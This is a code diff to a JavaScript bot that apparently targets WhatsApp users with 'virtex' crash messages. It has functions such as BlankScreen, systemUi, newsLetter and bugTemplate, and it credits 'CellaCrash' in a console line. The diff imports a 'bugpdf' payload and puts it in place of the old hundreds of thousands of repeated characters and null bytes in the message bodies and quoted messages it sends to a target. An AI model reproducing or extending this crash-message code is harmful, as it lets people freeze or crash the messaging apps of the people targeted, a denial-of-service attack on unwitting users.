@@ -30,6 +30,7 @@ async function getBuffer(url) {
 const JsConfuser = require('js-confuser');
 const yts = require("yt-search");
 const chalk = require('chalk');
+const { bugpdf } = require("./virtex/bugpdf.js")
 const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
 function getGreeting() {
   const hours = new Date().getHours();
@@ -1578,7 +1579,7 @@ async function XeonXRobust(target, Ptcp = true) {
     console.log(chalk.yellow.bold('ThunderBlast Device By ☆ CellaCrash'))
 }
  async function BlankScreen(target, Ptcp = false) {
-let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(150000) + "ྫྷ".repeat(150000);
+let virtex = "Wanna With Yours :D " + `${bugpdf}` + `${bugpdf}`
 			await cella.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
@@ -1791,7 +1792,7 @@ async function systemUi(target, Ptcp = false) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "Wanna With Yours. :D" + "ꦾ".repeat(300000)
+                        text: "Wanna With Yours. :D" + `${bugpdf}`.repeat(2)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -2000,12 +2001,12 @@ async function newsLetter(target) {
         target,
         {
           extendedTextMessage: {
-            text: "ꦾ".repeat(160000),
+            text: `${bugpdf}`,
             contextInfo: {
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Maaf Kak" + "\u0000".repeat(175000),
+                conversation: "Maaf Kak" + `${bugpdf}`,
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
@@ -2111,7 +2112,7 @@ async function bugTemplate(target) {
         target,
         {
           extendedTextMessage: {
-            text: "Wanna With Yours :)" + "ꦾ".repeat(160000),
+            text: "Wanna With Yours :)" + `${bugpdf}`,
             contextInfo: {
               stanzaId: "1234567890ABCDEF",
               participant: "0@s.whatsapp.net",
@@ -2221,13 +2222,13 @@ async function bugTemplate(target) {
         target,
         {
           extendedTextMessage: {
-            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(160000),
+            text: `Wanna With Yours :D -` + `${bugpdf}`,
             contextInfo: {
               fromMe: false,
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(160000),
+                conversation: "Gpp Yah:D ‌" + `${bugpdf}`
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
